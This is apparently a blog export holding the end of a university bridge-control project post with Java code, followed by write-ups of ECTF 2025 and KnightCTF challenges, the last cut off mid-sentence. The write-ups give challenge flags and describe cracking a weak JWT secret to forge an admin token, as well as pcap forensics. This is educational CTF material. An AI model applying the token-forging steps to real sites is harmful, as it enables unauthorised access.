31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 package mcp; import java.util.Timer; import java.util.TimerTask; public class Heartbeat extends Thread { private Send heartBeatSendObject; private Timer heartBeatTimer; private Gui userInterface; // Heartbeat interval in milliseconds (2 seconds) private static final long HEARTBEAT_INTERVAL = 2000; // Initial delay before first heartbeat (1 second) private static final long INITIAL_DELAY = 1000; Heartbeat(Send heartbeatObject, Gui userInterface) { this.heartBeatSendObject = heartbeatObject; this.userInterface = userInterface; // Make it a daemon thread this.heartBeatTimer = new Timer(true); } @Override public void run() { // scheduleAtFixedRate for repeating task heartBeatTimer.scheduleAtFixedRate(new TimerTask() { @Override public void run() { try { heartBeatSendObject.sendMessage(\u0026#34;heartbeat\u0026#34;); if (userInterface != null) { userInterface.updateMessageLog( \u0026#34;SENT: heartbeat\u0026#34;); } } catch (Exception e) { System.err.println(\u0026#34;Error sending heartbeat: \u0026#34; + e.getMessage()); } } }, INITIAL_DELAY, HEARTBEAT_INTERVAL); } public void stopHeartbeat() { if (heartBeatTimer != null) { heartBeatTimer.cancel(); System.out.println(\u0026#34;Heartbeat stopped\u0026#34;); } } } Main\rInside the main method the GUI class is created. Then the receiveThread is created and ran. After this, two Send objects are created, one for the GUI and one for the heartBeat. The guiSendObject is passed into the intialiseSender method of the GUI class as is the heartBeatSendObject to the HeartBeatThread. And that\u0026rsquo;s pretty much all the threads for the Java program.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 package mcp; public class App { private static final int RECEIVE_PORT_NUMBER = 3032; private static final int SEND_PORT_NUMBER = 3031; // Put 127.0.0.1 for Wokwi Simulator // private static final String SEND_IP_ADDR = \u0026#34;127.0.0.1\u0026#34;; private static final String SEND_IP_ADDR = \u0026#34;10.237.91.181\u0026#34;; public static void main(String[] args) throws Exception { // Create the GUI object first to get reference Gui userInterface = new Gui(); // Create and run the thread to receive messages Receive receiveThread = new Receive(RECEIVE_PORT_NUMBER, userInterface); receiveThread.start(); // Create the object to send GUI messages Send guiSendObject = new Send(SEND_PORT_NUMBER, SEND_IP_ADDR, userInterface); // Create the object to send heartbeat messages Send heartBeatSendObject = new Send(SEND_PORT_NUMBER, SEND_IP_ADDR, null); // Initialise the GUI with the send object userInterface.initializeSender(guiSendObject); // Create and run the threat to send heartbeat messages Heartbeat heartBeatThread = new Heartbeat(heartBeatSendObject, userInterface); heartBeatThread.start(); Runtime.getRuntime().addShutdownHook(new Thread(() -\u0026gt; { System.out.println(\u0026#34;Shutting down...\u0026#34;); heartBeatThread.stopHeartbeat(); receiveThread.interrupt(); })); } } Controls and Displays\rFor the actual controls and display, we have a Gui class which creates all the components (animation, buttons and message log). Other than that there isn\u0026rsquo;t really too much to the controls and display, it\u0026rsquo;s just code using the Swing library to make everything look nice and pretty (no point in going through that code because it\u0026rsquo;s just UI stuff). The annoying part about this is that the Java GUI wasn\u0026rsquo;t responsive to different screen sizes so some of the time went to making the changes I made on my PC look nice on my laptop. This is what the GUI looks like when connected to the ESP32:\nLessons Learnt\rThis project has taught me so much about designing a system from scratch and about embedded systems (something I definitely want to explore more):\nEMI is a real problem. I was pretty suprised when we discovered the issue with the motors causing EMI and messing up the readings from the ultrasonic sensors. The sensors just wouldn\u0026rsquo;t be able to get a reading no matter how much we changed the time of the pulse being sent. The solution (stop-measure-restart cycle) wasn\u0026rsquo;t optimal but given the time constraint we had when we discovered the problem it was the best option we had. This taught me how important it is to consider the physical environment when working with sensors and that the simulation won\u0026rsquo;t always match the actual run (I knew this but wasn\u0026rsquo;t expecting it in this way).\nTiming windows need a lot of buffer time. The initial bridge sequence time ran fine with the Wokwi simulations. But since the motors took longer to get the bridge in the desired state this cause false failures. I had to extend the window to 25-38 seconds to stop these false failures. It took me a while to realise this since it wasn\u0026rsquo;t obvious from the logs. The lesson here is to allow the mechanical systems to properly stablise and that the software should account for this rather than expecting the perfect outcome.\nHow useful queueing is. Instead of executing all the mode changes, bridge/gate changes and override commands instantly, queueing them not only prevented race conditions but allowed for checking safety conditions before executing the operation. This made life a lot easier and definitely avoided a lot of problems we would\u0026rsquo;ve encountered in a non-queue based approach.\nThings I\u0026rsquo;d Do Differently\rSeparate Repositories. Initially we actually had a single repository for both programs. But this caused a lot of issues with VSCode tasks and Java struggling with building the project. I would have a separate code base from the beginning if I had the option.\nEarly Documentation. I\u0026rsquo;d definitely update the doco as the project went on and not cram it all right before the assignment report was due. This would\u0026rsquo;ve also helped with creating this post.\nUnit Testing using Wokwi. Initially I only tested by relying on the actual ESP32 but I couldn\u0026rsquo;t take the full setup home so this meant I could only test for a couple hours every week. I wish I knew about Wokwi before and simulated all the test cases/scenarios sooner. I\u0026rsquo;d also try and find a way to make a pipeline for running these tests.\nCommunication. This is a non-technical point but we ended up having to cram all the testing right before the demonstration because the Structures team wasn\u0026rsquo;t prepared. Had we had better Communication with them we would\u0026rsquo;ve avoided this.\nConclusion\rThis project was insanely fun and the things I learnt are invaluable. All the late night debugging sessions paid off and our demonstration was pretty smooth other than a mechnical issue we had. For a 15 week university project, I\u0026rsquo;m really proud of what we created from scratch and a budget of $100. I\u0026rsquo;m also really happy with the multi-threaded design of both programs and safety architecture that we implemented. If I had to take away one thing from this project it would be our \u0026ldquo;what if\u0026rdquo; approach. This approach ensured that we were always proactive with all the problems rather than reactive. All the source code is available on Github as mentioned above.\nI hope you enjoyed this post as much as I enjoyed in creating the project.\n","date":"2025-11-10T01:00:00+11:00","image":"http://localhost:1313/p/engg3000-vertical-lift-bridge/cover_hu3017167220762526445.png","permalink":"http://localhost:1313/p/engg3000-vertical-lift-bridge/","title":"ENGG3000 Vertical Lift Bridge"},{"content":"Over the weekend, I solo participated in the 48-hour ECTF. I ranked 53rd out of 383 teams. Massive thanks to the Cyber \u0026amp; Chill team for hosting this CTF.\nCryptography\rASCII me anything but the flag\rDescription: There is an encrypted flag, good luck with that I encrypted it well!\n108 100 111 109 123 85 99 49 122 95 106 53 95 79 111 51 95 88 52 116 95 48 109 95 51 111 88 121 90 107 97 106 48 105 125 10 10 69 98 111 98 32 102 112 32 118 108 114 111 32 104 98 118 44 32 100 108 108 97 32 105 114 122 104 32 58 32 72 66 86 72 66 86 10 10 87 101 108 108 32 100 111 110 101 44 32 98 117 116 32 110 111 119 32 100 111 32 121 111 117 32 107 110 111 119 32 97 98 111 117 116 32 116 104 101 32 103 117 121 32 119 104 111 32 103 111 116 32 115 116 97 98 98 101 100 32 50 51 32 116 105 109 101 115 32 63\nAuthor: Antoine\nLooking at the range of numbers, my first guess was to convert them to ASCII.\nI guessed correct. From the conversion, the first two lines are still encrypted somehow but the last line hints towards what the next step is. Julius Caesar was stabbed 23 times so the next step must be to use the Caesar cipher.\nPutting the second line (Ebob fp vlro hbv, dlla irzh : HBVHBV) into Cyberchef with a variation of the Caesar Cipher (ROT47) to decipher the text gives the result:\nNow we have a key: KEYKEY. Using Cyberchef again, and the first line from the ASCII conversion (ldom{Uc1z_j5_Oo3_X4t_0m_3oXyZkaj0i}) we can use Vigenre decipher to get the flag:\nFlag: ectf{Th1s_i5_Th3_W4y_0f_3nCrYpti0n}\nCracking the Vault\rDescription: The vault is locked with a key, but we\u0026rsquo;ve managed to access a security computer. Unfortunately, the key is encrypted, and the owner forgot to remove the file that encrypts it. It appears to be some sort of homemade encryption, but dont worry this should be a piece of cake for you, right?\nAuthor: Antoine\nFor this challenge, there are two files. A python file which has an encryption function and a text file which is most likely the output of the python file.\nEncryption.py:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 import secrets import hashlib def encryption(text): encrypted = [] random = secrets.SystemRandom() padding_length = 256 - len(text) % 256 raw_padding = [chr(random.randint(32, 126)) for _ in range(padding_length)] scrambled_padding = [chr((ord(c) * 3 + 7) % 94 + 32) for c in raw_padding] shifted_padding = scrambled_padding[::-1] padded_text = \u0026#39;\u0026#39;.join(shifted_padding) + text final_padded_text = \u0026#39;\u0026#39;.join( chr((ord(c) ^ 42) % 94 + 32) if i % 2 == 0 else c for i, c in enumerate(padded_text) ) secret_key = str(sum(ord(c) for c in text)) secret_key = secret_key[::-1] hashed_key = hashlib.sha256(secret_key.encode()).hexdigest() seed = int(hashed_key[:16], 16) random = secrets.SystemRandom(seed) for i, char in enumerate(text): char_code = ord(char) shift = (i + 1) * 3 transformed = (char_code + shift + 67) % 256 encrypted.append(chr(transformed)) return \u0026#39;\u0026#39;.join(encrypted), seed with open(\u0026#39;VaultKey.txt\u0026#39;, \u0026#39;r\u0026#39;) as f: text = f.read() encrypted_text, seed = encryption(text) with open(\u0026#39;VaultKey_encrypted.txt\u0026#39;, \u0026#39;w\u0026#39;) as f: f.write(encrypted_text) print(\u0026#34;The file has been successfully encrypted!\u0026#34;) From the code it\u0026rsquo;s clear that the encryption function must be reversed and run on the text file to get the flag. At first I was a bit confused on how to approach this but going through the code I saw that there are a lot of red herrings. The main encryption that is happening to the original flag text is:\nConvert each character to its ASCII value. Calculate a shift value based on the character\u0026rsquo;s position. Add the shift value and 67 to the ASCII value the mod it by 256. Add this ASCII value to the final encrypted text. Using this information, the decryption function can be created:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 def decryption(encrypted_text): decrypted = [] for i, char in enumerate(encrypted_text): char_code = ord(char) shift = (i + 1) * 3 transformed = (char_code - 67 - shift) % 256 decrypted.append(chr(transformed)) return \u0026#39;\u0026#39;.join(decrypted) with open(\u0026#39;filepath_to_VaultKey_encrypted.txt\u0026#39;, \u0026#39;r\u0026#39;, encoding=\u0026#34;utf-8\u0026#34;) as f: encrypted_text = f.read() print(encrypted_text) decrypted_text = decryption(encrypted_text) print(decrypted_text) Running this python function on the provided encrypted file gives:\nFlag: ectf{1t_W45_ju5T_4_m1nu5}\nRSA Intro\rDescription: This is just a brief introduction to RSA nothing more nothing less.\nAuthor: Antoine\nThis challenge was pretty straightforward. We are given a text file that has n, e and c. So the RSA encryption can be easily reversed by putting the given values into a RSA deciphering tool:\nFlag: ectf{b4sic_F4cT0rDb_rS4}\nOIIAIOIIAI \rDescription: The cat made a mess of the flag , I have to retrieve the flag or my boss will be mad.\n}eYcbt4fB{yD0nUu_05Rp_1TNh_GM13R\nAuthor: Antoine\nGiven the challenge name, the text has been encrypted by some sort of \u0026lsquo;spinning\u0026rsquo; or \u0026rsquo;turning\u0026rsquo;. After some trial and error with different combinations of decrpytion on Cyberchef, I noticed something interesting. Starting from the second character in the encrypted text, skipping every other letter gives \u0026rsquo;ectf\u0026rsquo;. The first half of the flag is every even character and the second half is every odd character. I reversed this in python:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 input = \u0026#34;}eYcbt4fB{_yD0nUu_05Rp_1TNh_GM13R_\u0026#34; result = \u0026#34;\u0026#34; for i in range(1, len(input), 2): result += input[i] for i in range(0, len(input), 2): result += input[i] print(result) reverseString = result[17:] result = result[:17] reverseString = reverseString[::-1] result += reverseString print(result) Flag: ectf{y0U_5p1N_M3_R1GhT_R0unD_B4bY}\nForensics\rJustapcap\rDescription: An image has been stolen, can you find it in the PCAP file?\nAuthor: Greg\nFor this challenge, we are given a pcap file. At first glance, opening this in Wireshark, I can see that the file is just a whole lot of DNS messages sent from the same source and sent to the same destination.\nAfter inspecting the first few lines of the pcap file, I noticed that the body of the first DNS request matched the hex file signature of a PNG file (89 50 4E 47 0D 0A 1A 0A).\nTo get the actual image, I needed to extract all the lines without the words \u0026ldquo;exfil\u0026rdquo; or \u0026ldquo;attacker\u0026rdquo; in them. After doing this, I noticed that the number \u0026ldquo;2\u0026rdquo; was at the start of every row so I used the cut command to get rid of this.\nHowever the file still wasn\u0026rsquo;t being recognised as a proper PNG file and I started feeling like I hit a wall. After much investigation, I decided to have a look at it manually in notepad and noticed that there were many junk lines that needed to be removed.\nAfter manually removing these lines, I reversed the hex dump using:\nOpening binImage.png gave:\nFlag: ectf{DN5_3xf1ltr@t10n_15_f1nd3d}\nMy Dearest\rDescription: I have Received a love letter by a fake email. Can you help me to find who is the author?\nAuthor: Greg\nThis one was pretty straightforward. We are given a word document and need to submit the author\u0026rsquo;s name as the flag. I did this through exiftool.\nFlag: ectf{MichelTeller}\nCapture the Hidden\rDescription: A cybersecurity agent intercepted suspicious network traffic before disappearing. The attackers attempted to erase their tracks, but a PCAP file was recovered.\nSomewhere within these packets, a crucial file was exfiltrated. Can you analyze the traffic, extract the hidden data, and uncover the secret message?\nAuthor: Greg\nThis challenge wasn\u0026rsquo;t too bad either. Looking at the pcap file, 3 TCP messages instantly stand out. Right before the first TCP message is sent, a FTP request is sent with the username as \u0026ldquo;hacker\u0026rdquo;.\nA couple of lines before this FTP message, a POST request is sent to the same destination. Looking at the body of this POST request, there seems to be some sort of encrypted data, my first guess being base64.\nFlag: ectf{P05t_1s_v3ry_345y_T0_F1ND}\nHardware\rORbit\rDescription: You are given a logic circuit (see orbit.png) and asked to give the binary output corresponding to the input such that (x0, x1, x2, x3, x4) = (0, 1, 0, 1, 0). Surround your answer with ectf{ } to obtain the flag.\nAs an example, entering (x0, x1, x2, x3, x4) = (1, 0, 0, 0, 0) gives (y0, y1, y2, y3, y4, y5, y6), so the flag would be ectf{1111010}.\nAuthor: Loc\nThis challenge was really fun and different to the challenges I\u0026rsquo;ve done before. We are given a logic diagram and an input and need to find the output.\nI thought about doing this using some sort of simulator website but ended up doing the calculations by hand. I first labelled all the AND gates (can be seen in the image) to make it easier when doing the calculations.\nDoing this by hand was probably not the best way, since it\u0026rsquo;s pretty easy to mess up as I did on the left page and had to recalculate the values of y. In the end I was able to get the right values of y and as a result the right flag.\nFlag: ectf{0101011}\nIt is Trivial\rDescription: I forgot to write down the description for this challenge but it was just the previous challenge but way more complex. The input is 30478191278.\nAuthor: Loc\nSame scenario again, but this time it\u0026rsquo;s much harder.\nThis time I decided to use logic.ly. Since it was even more easy to mess up for this challenge, I labelled all the gates according to their column. This way I would be able to cross check the gates by labelling them in logic.ly.\nLooking at the diagram, I was a bit confused on how the number that was given would become the input. On the diagram, I noticed that 6 digit binary numbers were being used to produce the output in each \u0026ldquo;block\u0026rdquo;. There would be a carry over bit for the next block, which linked the whole circuit diagram. I then converted the given number into binary but the number of digits wasn\u0026rsquo;t a multiple of 6 (it was 35). This was solved by adding an extra 0 at the start of the converted binary number: 011100011000101001000100101010101110. I could split this up into blocks of 6 bits and input them into logic.ly.\nNow came the tedious part, recreating the diagram. After a lot of time clicking away and rechecking I was able to replicate the logic circuit from the diagram.\nI used switches to set the input (off is 0 and on is 1) and lights for the output. I somehow got lucky and had the correct output on the first go!\nFlag: ectf{100010011000}\nOSINT\rProject-153-Q1\rDescription:\nThomas Yatangaki : Have you ever visited this place ? I can\u0026rsquo;t remember the name\u0026hellip; Maboi  : Me neither \nThis first OSINT challenge was easy. Google searching the image returned the location of the place.\nFlag: ectf{Chutes_du_Caramy}\nAuthor: Egan\nProject-153-Q2\rDescription:\nThomas Yatangaki : Did you know that the exact position where I took the photo had a name ? It is such an interesting place full of history .\nAuthor: Egan\nThis challenge took some time since it wasn\u0026rsquo;t straightforward. Reverse searching the image, we get a mountain range in France known as Massif de l'Esterel. However this wasn\u0026rsquo;t the right flag.\nGoing through the search results, there are a lot of matches but none that give any hint as to what the flag could be. Maybe if I found the exact place of the photo, there might be a hint.\nI found this flicker post, which was geo-tagged. Going to this exact place in Google Maps and going into street view at this point, I can see that it is the exact place and the name of this place is Pointe de l\u0026rsquo;Observatoire. This happens to be the flag!\nFlag: ectf{Pointe_de_l'Observatoire}\nProject-153-Q4\rDescription:\nThomas Yatangaki : Bro, I think, we did the gr90 the wrong way round.\nMaboi  : damn  At least, the view was better at the end. Wait, do you see the place in the background in the middle ? We\u0026rsquo;ve got to get over there, what\u0026rsquo;s the name?\nThomas Yatangaki : No I don\u0026rsquo;t think we should .\nAuthor: Egan\nI needed to find the name of the mounts in the background of the image. Reverse searching this image using Google Lens, I\u0026rsquo;m able to find the name of the place in a post on a hiking website.\nI then went into Google Maps and searched Chapelle Notre-Dame de Constance. Going into street view, the chapel seems like the right place since I can see two islands in the back. Zooming all the way out on Maps, I see the name of the two islands, one of them being the flag.\nFlag: ectf{le_du_Levant}\nProject-153-Q5\rDescription:\nMaboi  : Bruh, the name of the mountain where I was lmao .\nAuthor: Egan\nFor this challenge, I had to crop the image since it was too big for searching on Google. Once cropped I was able to find this AllTrails post, which gave the name of the mountain.\nFlag: ectf{Gros_Cerveau}\nProject-153-Q6\rDescription:\nThomas Yatangaki : unfortunately, it\u0026rsquo;s not part of project 153, but it\u0026rsquo;s still very beautiful here .\nMaboi  : How many steps were there again ?\nFlag format: ectf{number_zipcodeofthetown}\nAuthor: Egan\nThis challenge was two-fold. I had to find the number of stairs in the image and also the zip code of the place. I was able to find this page which gave the name of the place; Notre Dame de Beauvoir. Using this, I found the number of stairs on this website. Finally, I used maps to get the postcode of the place.\nFlag: ectf{262_04360}\nSteganography\rSilhouette in Cyberpunk\rDescription: I didn\u0026rsquo;t write down the description for this challenge but it was something to do with the given image.\nAuthor: Antoine\nThis challenge was different, confusing at first but very fun. I used all the common stega tools (stegsolve, binwalk, exiftool) but nothing gave any clue. I had a closer look at the image and saw that there were dots on two of the buildings. I had a hunch that it was Braille (I don\u0026rsquo;t know how I thought about this as I\u0026rsquo;ve never seen the syntax of Braille). I had guessed correctly!\nUsing a Braille convertor and the dots from the first building I was able to get the first message.\n         = this is just a dum my, ni ce try\nNow I knew that I was on the right track.\nI did the same with the building in the back left:\n       = h14 d3n 1n th3 d4 rkn 3ss\nFlag: ectf{h1dd3n_1n_th3_d4rkn3ss}\nWeb\rJava Weak Token\rDescription: The admin has stored a flag in the admin section, but he let you access the page since he has secured the access to it. Maybe you should show him why using a weak secret isn\u0026rsquo;t a good idea .\nAuthor: Louis\nFor this challenge, the following website is presented:\nWe are shown our JWT token and somehow need to use this information to access the admin page. Going into Burp Suite, I can see that this exact token is being sent for authorisation.\nI used this JWT cracker to find out what the secret is to maybe modify the JWT and pretend to be the admin.\nLet\u0026rsquo;s go! We got the secret. I can now modify the token using jwt.io.\nI used the default HS256 algorithm, entered the secret and changed the username to admin. Next, I clicked on the \u0026ldquo;Can I access the admin page?\u0026rdquo; button and intercepted the request and replaced my token with the modified token.\nAnd after hitting forward:\nFlag: ectf{JwT_T0keN_cR34t0r}\nThank You\rIf youve made it this far, I hope youve enjoyed this writeup and thank you for reading it! Thanks again to the Cyber \u0026amp; Chill team for organising this CTF.\n","date":"2025-02-04T10:00:00+11:00","image":"http://localhost:1313/p/ectf-2025/cover_hu11981104924221128776.png","permalink":"http://localhost:1313/p/ectf-2025/","title":"ECTF 2025 Writeup"},{"content":"I recently solo participated in the 24-hour KnightCTF. I placed 197th out of the 759 teams. Huge thanks to the Knight Squad for hosting this really fun CTF.\nReverse Engineering\rBinary Quest\rDescription: In the far-off kingdom of Valoria, an ancient relic called the Sacred Flag lies hidden within a guarded fortress. Legend says only a true knight of cunning and skill can lay claim to its power. Dare you venture into the shadows and emerge victorious? Your journey begins nowonward, brave soul, and seize your destiny in the Binary Quest.\nAuthor: NomanProdhan\nFor this challenge, we are given a binary file called binary.quest. Before trying open it in Ghidra, I decided to run the strings command on the file to see if anything interesting comes up. The following came up:\nThis file has been packed with UPX V4.24. After a bit of research, I found out that there is a UPX tool available to unpack the file, which I installed using the command sudo apt install upx. I then unpacked the file using upx -d binary.quest. I was now able to open the file using Ghidra to understand how the file works.\nMost of the functions weren\u0026rsquo;t interesting but FUN_00101Oa0 seemed to be the way to go. The logic that checks if the users\u0026rsquo; input matches the flag is:\n1 2 3 4 5 6 7 8 9 10 11 12 13 printf(\u0026#34;Enter the sacred flag to complete your quest: \u0026#34;); __isoc99_scanf(\u0026amp;DAT_00102356,local_58); sVar2 = strlen(local_58); FUN_00101330(local_58,sVar2 \u0026amp; 0xffffffff); iVar1 = strcmp(local_58,local_98); if (iVar1 == 0) { puts(\u0026#34;\\nYou have proven your valor, oh noble knight!\u0026#34;); puts(\u0026#34;The kingdom rejoices at your triumph, and the hidden flag is indeed yours.\\n\u0026#34;); } else { puts(\u0026#34;\\nAlas, you have failed this time. The quest remains unfulfilled...\u0026#34;); puts(\u0026#34;Return stronger and try again, brave knight.\\n\u0026#34;); } The program checks if the users\u0026rsquo; input (local__58) is equal to the variable local_98, which contains the flag. Looking at lines 42-45 we can see what the value of local_98 is, alongside two other variables:\n1 2 3 4 local_88._0_4_ = 0x7d5f3f59; local_98._8_4_ = 0x37695f73; local_98._0_8_ = 0x34575f7b4654434b; uStack_8c = 0x7334655f Decoding these hex values using CyberChef we get the following:\nlocal_88._0_4_ = }_?Y local_98._8_4_ = 7i_s local_98._0_8_ = 4W_{FTCK uStack_8c = s4e_ FTCK is KCTF backwards which is the format of the flags, so these values need to reversed and concatenated to get the flag.\nFlag: KCTF{_W4s_i7_e4sY?_}\nEasy Path to the Grail\rDescription: Brave knight, your quest is simple yet essentialunlock the secrets hidden in this binary challenge and tread the path to the grail. The journey will test your wits as you reverse the provided binary, uncovering the treasure within.\nAuthor: NomanProdhan\nFor this challenge, we are given a binary file called grail.knight. Running strings on the file doesn\u0026rsquo;t return anything interesting so I opened it in Ghidra. This time there are a few interesting functions main, transforming_input and do_fight.\nInside the main function, the program takes in the users\u0026rsquo; input (local_198), runs the transform_input function with the parameters as local_198 and local_118 which is an empty variable. It then checks if local_118 is equal to some string value. If it is, then the users\u0026rsquo; input is the correct flag.\n1 2 3 4 5 6 7 8 9 10 11 12 13 printf(\u0026#34;Enter the password (the original flag): \u0026#34;); iVar1 = __isoc99_scanf(\u0026#34;%127s\u0026#34;,local_198); if (iVar1 == 1) { transform_input(local_198,local_118); iVar1 = strcmp(local_118,\u0026#34;D2C22A62DEA62CCE9EFA0ECC86CE9AFA4ECC6EFAC6162C3636CC76E6A6BE\u0026#34;); if (iVar1 == 0) { printf(\u0026#34;Correct! The flag is %s\\n\u0026#34;,local_198); } else { puts(\u0026#34;Wrong password!\u0026#34;); } uVar2 = 0; } Looking at transform_input, we can see:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 void transform_input(char *param_1,char *param_2) { byte bVar1; char *local_28; char *local_20; local_28 = param_2; for (local_20 = param_1; *local_20 != \u0026#39;\\0\u0026#39;; local_20 = local_20 + 1) { bVar1 = do_fight(*local_20); sprintf(local_28,\u0026#34;%02X\u0026#34;,(ulong)bVar1); local_28 = local_28 + 2; } *local_28 = \u0026#39;\\0\u0026#39;; return; } This function calls the do_fight function, likely doing some sort of byte conversion, on each character of the input string param_1, which is the users\u0026rsquo; input. Each byte is then converted as a two digit hexadecimal string and stored in param_2 which points to local_118 from the function call in main. In do_fight, the following can be seen:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 byte do_fight(byte param_1) { byte local_1c; byte local_d; int local_c; local_d = 0; local_1c = param_1; for (local_c = 0; local_c \u0026lt; 8; local_c = local_c + 1) { local_d = local_d \u0026lt;\u0026lt; 1 | local_1c \u0026amp; 1; local_1c = local_1c \u0026gt;\u0026gt; 1; } return local_d; } Given a byte, do_fight will return the reverse. So given the string value that local_118 is compared with, we need to convert it into binary, reverse the binary and covert it to text, which will give us the flag. Doing this in CyberChef gives the following:\nFlag: KCTF{e4sy_p3asY_r3v_ch4ll3nge}\nKnight\u0026rsquo;s Droid\rDescription: For ages, a cryptic mechanical guardian has slumbered beneath the Knights Citadel. Some say it holds powerful secrets once wielded by ancient code-wielding Knights. Many have tried to reactivate the droid and claim its hidden knowledgeyet none have returned victorious. Will you be the one to solve its riddles and awaken this legendary machine?\nAuthor: NomanProdhan\nFor this challenge, we are given an APK file called knights_droid. I open it using jadx knights_droid.apk. Inside the source code the following main function can be seen:\nThe program checks to see if the user has the right flag by calling the function verifyFlag function from the SecretKeyVerifier class.\nLooking at the SecretKeyVerifier class, it can be seen that the verifyFlag function encodes the users\u0026rsquo; input and then compares it with GYPB{_ykjcnwp5_GJECDP_u0q_c0p_uKqN_Gj1cd7_zN01z_}, which is most likely the flag. I guessed that it was probably some type of substitution cipher so I brute forced (ROT13) the string using CyberChef and got the following:\nFlag: KCTF{_congrat5_KNIGHT_y0u_g0t_yOuR_Kn1gh7_dR01d_}\nWeb\rKnightCal\rDescription: In the realm of ancient codes, only those who enumerate correctly can unveil the hidden flag. Craft your mathematical expressions wisely and uncover the secrets that lie within.\nAuthor: NomanProdhan\nGoing to the given website the following calculator page is shown: After entering 1234, this output was given: It was clear that the numbers corresponded to letters in some way, so I decided to try all the digits: Given this output, I wanted to try and create the word flag as the website would then return flag.txt. Given the output from above I used 7195 as the input since:\n7 = f 1 = l 9 = a 5 = g Flag: KCTF{_c0ngR4t5_KNIGHT_f1naLLy_Y0U_g07_tH3_r1gh7_m4tH_}\nCryptography\rReflections in the Random\rDescription: Weve uncovered a single string thats saturated with possibilities. At first glance, it might resemble standard Base64 outputbut every attempt to decode it directly results in chaotic gibberish.\nSome agents suspect an unconventional passphrase or a stray cosmic phenomenon that shifted the bits; others whisper about symmetrical illusions that hide the real message. We even tried old-fashioned classical cipherssimple shifts, sub-harmonic permutations, you name itbut the truth remains elusive.\nAll we know is that the message is said to be spun backward from a single pivot, though no one agrees what that means. Could it mean time is reversed? Maybe its an obscure numeric transformation. Rumor has it that if you find the key, everything falls into place. Or maybe its simpler than we thinkjust cleverly disguised.\nGood luck dissecting this anomaly. Remember: When the obvious leads nowhere, perhaps the solution sits right in front of youonly viewed from the wrong angle.\nAuthor: pmsiam0\nWe are given Cipher.txt which contains the following text:\nchipher: PzExcRcFHQsdOxF2cR0WEXIPOQQWAQk=\nkey = 0x42\nGiven the challenge description, I know that during the decryption process, there must be some sort of reversal. I head to CyberChef and start trying different combinations. Since we are just given a key, I think that we need to use XOR somewhere. The key 0x42 is the letter B. Using this information, I decode it from Base64, reverse the output then XOR using the letter B. This recipe gives the following:\nFlag: KCTF{M0ST_34Sy_I_GU3ss}\nForward, Yet It Falls Back\rDescription: We discovered a peculiar string that appears standard but yields gibberish under normal decoding. Some analysts detect suspicious symmetry, hinting at reflection or an inverted dimension. Others suspect hidden block boundaries or a backwards encoding, while a few insist it\u0026rsquo;s rotated on a different axis.\nOur only clue: Symbols may shift forward, but the key is often in reversing what we think is correct.\nGood luck peeling back the layerssometimes you must step backward to see whats right before you.\nAuthor: pmsiam0\nIn this challenge, we are given a text file that contains the following:\nbase32: G7G2DGQ5SY4DCK5YVUDRROJI3UOAUUNTVR6XKDOKQO4CAAKK2MJA====\nkey = 0123456789ABCDEF\niv = FEDCBA9876543210\nAgain, I head to CyberChef and start experimenting. I know that the first step is to decode the string use Base32. From here, I know that I probably won\u0026rsquo;t be able to decode it using any simple cipher, given the challenge description. Given the hint \u0026ldquo;Symbols may shift forward\u0026rdquo; and the fact that we are given a key and iv, I\u0026rsquo;m thinking it is some mode of AES.\nAfter converting the decoded Base32 string to hex and decrypting the string in CBC using the given key and iv the following is given:\nFlag: KCTF{R3vers3_R3vers3_D3C0DE}\nNetworks\rServer \u0026amp; Attacker IP\rDescription: In this challenge, I\u0026rsquo;ve crafted a series of intricate scenarios that will test your investigative skills. You\u0026rsquo;ll dive into a network of secrets, uncover hidden identities, and piece together the story of a complex cyber attack. Each step requires careful analysis and keen observation. There are total 17 challenges \u0026amp; 3 pcap files in this category. The files will be provided accordingly. The answers are there, but they won\u0026rsquo;t come easilyyou\u0026rsquo;ll need to think like an attacker and act like a detective. Get ready to unravel the mystery and prove your prowess in this thrilling journey.\nWhat are the server \u0026amp; attacker IPs?\nAuthor: TareqAhamed (0xt4req)\nFor this challenge and all following network challenges, we\u0026rsquo;re given a capture1.pcapng file. In this first challenge, we have to find the server and attacker IPs. Quickly scrolling over the file, I can see that there are a lot of [SYN] TCP packets being sent from 192.168.1.9 to 192.167.1.10. 192.167.1.10 is then replying with [RST, ACK].\nSince this exchange goes on for quite I while, I\u0026rsquo;m thinking that the attacker is 192.168.1.9 and they are running some sort of port scan on the server at 192.167.1.10.\nFlag: 192.168.1.10_192.168.1.9\nThe Intruder\u0026rsquo;s Identity\rDescription: The attacker has gained access. Can you find out the username and password he used?\nAuthor: TareqAhamed (0xt4req)\nLooking at the packets, it\u0026rsquo;s clear that 192.167.1.10 is a web server. I filter the packets using ip.src == 192.168.1.9 \u0026amp;\u0026amp; http.request.method == POST \u0026amp;\u0026amp; ip.dst == 192.168.1.10 and the first packet that comes up is to /register. Looking at this packet the following details are found:\n1 2 3 4 5 6 7 HTML Form URL Encoded: application/x-www-form-urlencoded Form item: \u0026#34;_token\u0026#34; = \u0026#34;pLDuHThQ1RGo8gXsm7ZHtxYLr66KDMWMXJEt8GEa\u0026#34; Form item: \u0026#34;name\u0026#34; = \u0026#34;TheExploiter\u0026#34; Form item: \u0026#34;username\u0026#34; = \u0026#34;theexploiter\u0026#34; Form item: \u0026#34;email\u0026#34; = \u0026#34;theexploiter@knightblog.com\u0026#34; Form item: \u0026#34;password\u0026#34; = \u0026#34;exploiter@test\u0026#34; Form item: \u0026#34;password_confirmation\u0026#34; = \u0026#34;exploiter@test\u0026#34; Flag: KCTF{theexploiter_exploiter@test}\nThe Real Admin\rDescription: Can you identify the real admin\u0026rsquo;s ip?\nAuthor: TareqAhamed (0xt4req)\nFiltering the packets using http.request.method == POST \u0026amp;\u0026amp; ip.addr == 192.168.1.10 doesn\u0026rsquo;t help because the attacker has used some sort of web enumeration tool to try and brute force the admins\u0026rsquo; password.\nSo the attackers\u0026rsquo; IP address needs to be filtered out.\nhttp.request.method == POST \u0026amp;\u0026amp; ip.addr == 192.168.1.10 \u0026amp;\u0026amp; !ip.addr == 